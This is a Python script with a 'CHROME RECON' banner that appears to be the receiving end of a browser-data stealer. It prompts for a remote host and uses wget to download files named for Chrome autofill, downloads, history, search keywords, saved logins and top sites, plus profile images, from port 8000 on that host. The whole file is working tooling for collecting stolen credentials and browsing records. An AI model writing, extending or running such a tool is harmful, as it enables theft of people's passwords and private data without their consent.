import wget
import os
import shutil
import subprocess
import time

def banner():
    print('''
      ________  ______  ____  __  _________
  / ____/ / / / __ \/ __ \/  |/  / ____/
 / /   / /_/ / /_/ / / / / /|_/ / __/   
/ /___/ __  / _, _/ /_/ / /  / / /___   
\_______ /________________  __/_____/   
   / __ \/ ____/ ____/ __ \/ | / /      
  / /_/ / __/ / /   / / / /  |/ /       
 / _, _/ /___/ /___/ /_/ / /|  /        
/_/ |_/_____/\____/\____/_/ |_/         
                                       
    ''')

def receive(rhost):
    subprocess.call("wget -r --no-parent http://%s:8000/%s"%(rhost,"user-profile-images"),shell=True)
    files=["fautofill","fdownloads","fhistory","fkeywords","flogins","ftopsites"]
    for x in files:
        url = 'http://%s:8000/%s'%(rhost,x)
        wget.download(url,x)
    print("Download finished successfully...")

def cleanjunk(rhost):
    jfiles=["fautofill","fdownloads","fhistory","fkeywords","flogins","ftopsites"]
    jdir="user-profile-images"
    for x in jfiles:
        if os.path.exists(x):
            os.remove(x)
    if os.path.exists(rhost+":8000/"+jdir):
        shutil.rmtree(rhost+":8000/"+jdir)

if __name__ == "__main__":
    banner()
    print('Make sure that you give correct IP for RHOST')
    print("For self testing give loopback address")
    rhost=str(input("ENTER RHOST : "))
    cleanjunk(rhost)
    time.sleep(2)
    receive(rhost)